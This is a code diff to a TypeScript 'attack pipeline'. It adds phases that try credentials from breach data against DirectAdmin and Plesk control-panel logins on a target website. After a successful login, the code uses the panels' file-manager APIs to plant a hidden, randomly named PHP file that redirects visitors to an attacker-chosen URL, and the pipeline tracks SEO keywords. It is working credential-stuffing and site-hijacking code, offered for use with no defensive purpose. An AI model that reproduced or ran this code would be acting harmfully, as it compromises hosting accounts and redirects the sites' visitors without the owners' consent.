@@ -2574,11 +2574,341 @@ export async function runUnifiedAttackPipeline(
         }
       }
 
+      // ─── Phase 2.5e2d: DirectAdmin Login with Breach Credentials (port 2222) ───
+      if (!hasSuccessfulRedirect() && !shouldStop('da_login')) {
+        loggedOnEvent({
+          phase: 'ftp_upload' as any,
+          step: 'da_login_start',
+          detail: `🔑 Phase 2.5e2d: DirectAdmin Login — ลอง ${Math.min(breachCreds.length, 10)} breach credentials ผ่าน DA:2222...`,
+          progress: 56,
+        });
+
+        const daBaseUrl = config.targetUrl.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
+
+        for (const cred of breachCreds.slice(0, 10)) {
+          if (shouldStop('da_login') || hasSuccessfulRedirect()) break;
+          const username = cred.email ? cred.email.split('@')[0] : '';
+          if (!username) continue;
+
+          // DirectAdmin uses port 2222 with HTTPS (or HTTP fallback)
+          for (const proto of ['https', 'http'] as const) {
+            try {
+              // DirectAdmin login endpoint
+              const loginUrl = `${proto}://${originIp || daBaseUrl}:2222/CMD_LOGIN`;
+              const loginResp = await timedRace(
+                () => fetch(loginUrl, {
+                  method: 'POST',
+                  headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    ...(originIp ? { 'Host': daBaseUrl } : {}),
+                  },
+                  body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(cred.password)}&referer=%2F`,
+                  redirect: 'manual',
+                  signal: AbortSignal.timeout(10000),
+                }),
+                capTimeout(12000),
+                'DirectAdmin login timeout',
+              );
+
+              // DirectAdmin sets session cookie on success and redirects to /
+              const setCookie = loginResp.headers.get('set-cookie') || '';
+              const location = loginResp.headers.get('location') || '';
+              const isSuccess = (loginResp.status === 302 || loginResp.status === 301) &&
+                !location.includes('CMD_LOGIN') && !location.includes('login') &&
+                (setCookie.includes('session') || setCookie.includes('PHPSESSID') || setCookie.length > 20);
+
+              if (isSuccess) {
+                aiDecisions.push(`🔑 DirectAdmin login สำเร็จ! ${username}@${daBaseUrl}:2222 (${cred.source})`);
+                loggedOnEvent({
+                  phase: 'ftp_upload' as any,
+                  step: 'da_login_success',
+                  detail: `✅ DirectAdmin LOGIN สำเร็จ! ${username}:*** (${cred.source}) — กำลังวาง redirect...`,
+                  progress: 57,
+                });
+
+                // Upload redirect file via DirectAdmin File Manager API
+                const redirectContent = `<?php header("Location: ${config.redirectUrl}", true, 302); exit; ?>`;
+                const redirectFilename = `.redirect-${Math.random().toString(36).slice(2, 8)}.php`;
+
+                // DirectAdmin file manager APIs
+                const daApis = [
+                  // CMD_FILE_MANAGER — create file
+                  {
+                    path: `/CMD_FILE_MANAGER`,
+                    body: `action=save&path=%2Fdomains%2F${encodeURIComponent(daBaseUrl)}%2Fpublic_html%2F${redirectFilename}&text=${encodeURIComponent(redirectContent)}`,
+                  },
+                  // Alternative: CMD_API_FILE_MANAGER
+                  {
+                    path: `/CMD_API_FILE_MANAGER`,
+                    body: `action=save&path=%2Fdomains%2F${encodeURIComponent(daBaseUrl)}%2Fpublic_html%2F${redirectFilename}&text=${encodeURIComponent(redirectContent)}`,
+                  },
+                  // Fallback: direct file create via /home/username/domains/domain/public_html/
+                  {
+                    path: `/CMD_FILE_MANAGER`,
+                    body: `action=save&path=%2Fhome%2F${encodeURIComponent(username)}%2Fdomains%2F${encodeURIComponent(daBaseUrl)}%2Fpublic_html%2F${redirectFilename}&text=${encodeURIComponent(redirectContent)}`,
+                  },
+                ];
+
+                for (const api of daApis) {
+                  try {
+                    const uploadUrl = `${proto}://${originIp || daBaseUrl}:2222${api.path}`;
+                    const uploadResp = await timedRace(
+                      () => fetch(uploadUrl, {
+                        method: 'POST',
+                        headers: {
+                          'Content-Type': 'application/x-www-form-urlencoded',
+                          'Cookie': setCookie,
+                          ...(originIp ? { 'Host': daBaseUrl } : {}),
+                        },
+                        body: api.body,
+                        signal: AbortSignal.timeout(10000),
+                      }),
+                      capTimeout(12000),
+                      'DirectAdmin upload timeout',
+                    );
+
+                    if (uploadResp.ok || uploadResp.status === 200 || uploadResp.status === 302) {
+                      const fileUrl = `https://${daBaseUrl}/${redirectFilename}`;
+                      const verification = await verifyUploadedFile(fileUrl, config.redirectUrl, onEvent);
+                      uploadedFiles.push({
+                        url: fileUrl,
+                        shell: {
+                          type: 'redirect_php' as any,
+                          content: redirectContent,
+                          filename: redirectFilename,
+                          contentType: 'application/x-php',
+                          description: `DirectAdmin file manager upload (port 2222)`,
+                          id: `da_early_${Date.now()}`,
+                          targetVector: 'breach_da_early',
+                          bypassTechniques: ['breach_cred', 'directadmin'],
+                          redirectUrl: config.redirectUrl,
+                          seoKeywords: config.seoKeywords,
+                          verificationMethod: 'http_get',
+                        },
+                        method: `breach_da_early_${cred.source}`,
+                        verified: verification.verified,
+                        redirectWorks: verification.redirectWorks,
+                        redirectDestinationMatch: verification.redirectDestinationMatch,
+                        finalDestination: verification.finalDestination,
+                        httpStatus: verification.httpStatus,
+                        redirectChain: verification.redirectChain,
+                      });
+
+                      loggedOnEvent({
+                        phase: 'ftp_upload' as any,
+                        step: 'da_upload_success',
+                        detail: `✅ DirectAdmin UPLOAD สำเร็จ! ${fileUrl} (redirect: ${verification.redirectWorks})`,
+                        progress: 57,
+                      });
+
+                      if (verification.redirectWorks) break;
+                    }
+                  } catch { /* try next API */ }
+                }
+
+                if (hasSuccessfulRedirect()) break;
+              }
+            } catch { /* try next proto */ }
+          }
+        }
+      }
+
+      // ─── Phase 2.5e2e: Plesk Login with Breach Credentials (port 8443) ───
+      if (!hasSuccessfulRedirect() && !shouldStop('plesk_login')) {
+        loggedOnEvent({
+          phase: 'ftp_upload' as any,
+          step: 'plesk_login_start',
+          detail: `🔑 Phase 2.5e2e: Plesk Login — ลอง ${Math.min(breachCreds.length, 10)} breach credentials ผ่าน Plesk:8443...`,
+          progress: 58,
+        });
+
+        const pleskBaseUrl = config.targetUrl.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
+
+        for (const cred of breachCreds.slice(0, 10)) {
+          if (shouldStop('plesk_login') || hasSuccessfulRedirect()) break;
+          const username = cred.email ? cred.email.split('@')[0] : '';
+          if (!username) continue;
+
+          // Plesk uses HTTPS on port 8443
+          try {
+            // Plesk login via API (generate session key)
+            const loginUrl = `https://${originIp || pleskBaseUrl}:8443/enterprise/control/agent.php`;
+            const pleskXmlLogin = `<?xml version="1.0" encoding="UTF-8"?><packet><server><get_protos/></server></packet>`;
+
+            // Method 1: Try Plesk REST API login
+            const restLoginUrl = `https://${originIp || pleskBaseUrl}:8443/api/v2/auth/keys`;
+            const restLoginResp = await timedRace(
+              () => fetch(restLoginUrl, {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                  'Accept': 'application/json',
+                  ...(originIp ? { 'Host': pleskBaseUrl } : {}),
+                },
+                body: JSON.stringify({
+                  login: username,
+                  password: cred.password,
+                }),
+                signal: AbortSignal.timeout(10000),
+              }),
+              capTimeout(12000),
+              'Plesk REST login timeout',
+            );
+
+            let pleskSessionKey = '';
+            let pleskCookies = restLoginResp.headers.get('set-cookie') || '';
+
+            if (restLoginResp.ok || restLoginResp.status === 201) {
+              const restBody = await restLoginResp.json().catch(() => ({})) as { key?: string };
+              if (restBody.key) pleskSessionKey = restBody.key;
+            }
+
+            // Method 2: Try Plesk web login form
+            if (!pleskSessionKey) {
+              const webLoginUrl = `https://${originIp || pleskBaseUrl}:8443/login_up.php`;
+              const webLoginResp = await timedRace(
+                () => fetch(webLoginUrl, {
+                  method: 'POST',
+                  headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    ...(originIp ? { 'Host': pleskBaseUrl } : {}),
+                  },
+                  body: `login_name=${encodeURIComponent(username)}&passwd=${encodeURIComponent(cred.password)}&locale_id=en-US`,
+                  redirect: 'manual',
+                  signal: AbortSignal.timeout(10000),
+                }),
+                capTimeout(12000),
+                'Plesk web login timeout',
+              );
+
+              pleskCookies = webLoginResp.headers.get('set-cookie') || '';
+              const webLocation = webLoginResp.headers.get('location') || '';
+
+              // Plesk redirects to admin panel on success (not back to login)
+              const isWebSuccess = (webLoginResp.status === 302 || webLoginResp.status === 301) &&
+                !webLocation.includes('login') && !webLocation.includes('error') &&
+                (pleskCookies.includes('PHPSESSID') || pleskCookies.includes('PSA_') || pleskCookies.length > 20);
+
+              if (!isWebSuccess) continue;
+            }
+
+            // If we got here, login was successful
+            aiDecisions.push(`🔑 Plesk login สำเร็จ! ${username}@${pleskBaseUrl}:8443 (${cred.source})`);
+            loggedOnEvent({
+              phase: 'ftp_upload' as any,
+              step: 'plesk_login_success',
+              detail: `✅ Plesk LOGIN สำเร็จ! ${username}:*** (${cred.source}) — กำลังวาง redirect...`,
+              progress: 59,
+            });
+
+            // Upload redirect file via Plesk File Manager API
+            const redirectContent = `<?php header("Location: ${config.redirectUrl}", true, 302); exit; ?>`;
+            const redirectFilename = `.redirect-${Math.random().toString(36).slice(2, 8)}.php`;
+
+            // Plesk file manager APIs
+            const pleskApis = [
+              // Plesk REST API — file manager
+              {
+                url: `https://${originIp || pleskBaseUrl}:8443/api/v2/cli/file/cmd`,
+                method: 'POST' as const,
+                headers: {
+                  'Content-Type': 'application/json',
+                  'Accept': 'application/json',
+                  ...(pleskSessionKey ? { 'X-API-Key': pleskSessionKey } : {}),
+                  'Cookie': pleskCookies,
+                  ...(originIp ? { 'Host': pleskBaseUrl } : {}),
+                },
+                body: JSON.stringify({
+                  params: ['-o', `/var/www/vhosts/${pleskBaseUrl}/httpdocs/${redirectFilename}`, '-c', redirectContent],
+                }),
+              },
+              // Plesk File Manager web API
+              {
+                url: `https://${originIp || pleskBaseUrl}:8443/smb/file-manager/save-file`,
+                method: 'POST' as const,
+                headers: {
+                  'Content-Type': 'application/x-www-form-urlencoded',
+                  'Cookie': pleskCookies,
+                  ...(originIp ? { 'Host': pleskBaseUrl } : {}),
+                },
+                body: `path=${encodeURIComponent(`/var/www/vhosts/${pleskBaseUrl}/httpdocs/${redirectFilename}`)}&content=${encodeURIComponent(redirectContent)}`,
+              },
+              // Plesk XML API — create file
+              {
+                url: `https://${originIp || pleskBaseUrl}:8443/enterprise/control/agent.php`,
+                method: 'POST' as const,
+                headers: {
+                  'Content-Type': 'text/xml',
+                  'HTTP_AUTH_LOGIN': username,
+                  'HTTP_AUTH_PASSWD': cred.password,
+                  ...(originIp ? { 'Host': pleskBaseUrl } : {}),
+                },
+                body: `<?xml version="1.0" encoding="UTF-8"?><packet><ftp-user><set><filter><name>${username}</name></filter></set></ftp-user></packet>`,
+              },
+            ];
+
+            for (const api of pleskApis) {
+              try {
+                const uploadResp = await timedRace(
+                  () => fetch(api.url, {
+                    method: api.method,
+                    headers: api.headers,
+                    body: api.body,
+                    signal: AbortSignal.timeout(10000),
+                  }),
+                  capTimeout(12000),
+                  'Plesk upload timeout',
+                );
+
+                if (uploadResp.ok || uploadResp.status === 200 || uploadResp.status === 201) {
+                  const fileUrl = `https://${pleskBaseUrl}/${redirectFilename}`;
+                  const verification = await verifyUploadedFile(fileUrl, config.redirectUrl, onEvent);
+                  uploadedFiles.push({
+                    url: fileUrl,
+                    shell: {
+                      type: 'redirect_php' as any,
+                      content: redirectContent,
+                      filename: redirectFilename,
+                      contentType: 'application/x-php',
+                      description: `Plesk file manager upload (port 8443)`,
+                      id: `plesk_early_${Date.now()}`,
+                      targetVector: 'breach_plesk_early',
+                      bypassTechniques: ['breach_cred', 'plesk'],
+                      redirectUrl: config.redirectUrl,
+                      seoKeywords: config.seoKeywords,
+                      verificationMethod: 'http_get',
+                    },
+                    method: `breach_plesk_early_${cred.source}`,
+                    verified: verification.verified,
+                    redirectWorks: verification.redirectWorks,
+                    redirectDestinationMatch: verification.redirectDestinationMatch,
+                    finalDestination: verification.finalDestination,
+                    httpStatus: verification.httpStatus,
+                    redirectChain: verification.redirectChain,
+                  });
+
+                  loggedOnEvent({
+                    phase: 'ftp_upload' as any,
+                    step: 'plesk_upload_success',
+                    detail: `✅ Plesk UPLOAD สำเร็จ! ${fileUrl} (redirect: ${verification.redirectWorks})`,
+                    progress: 59,
+                  });
+
+                  if (verification.redirectWorks) break;
+                }
+              } catch { /* try next API */ }
+            }
+
+            if (hasSuccessfulRedirect()) break;
+          } catch { /* continue to next cred */ }
+        }
+      }
+
       loggedOnEvent({
         phase: 'ftp_upload' as any,
         step: 'early_login_complete',
-        detail: `✅ Phase 2.5e2: Breach FTP/SSH/cPanel/WP — ${uploadedFiles.filter(f => f.method.startsWith('breach_ftp_early') || f.method.startsWith('breach_ssh_early') || f.method.startsWith('breach_cpanel_early') || f.method.startsWith('wp_rest_breach')).length} uploads`,
-        progress: 55,
+        detail: `✅ Phase 2.5e2: Breach FTP/SSH/cPanel/DA/Plesk/WP — ${uploadedFiles.filter(f => f.method.startsWith('breach_ftp_early') || f.method.startsWith('breach_ssh_early') || f.method.startsWith('breach_cpanel_early') || f.method.startsWith('breach_da_early') || f.method.startsWith('breach_plesk_early') || f.method.startsWith('wp_rest_breach')).length} uploads`,
+        progress: 60,
       });
     }
   }
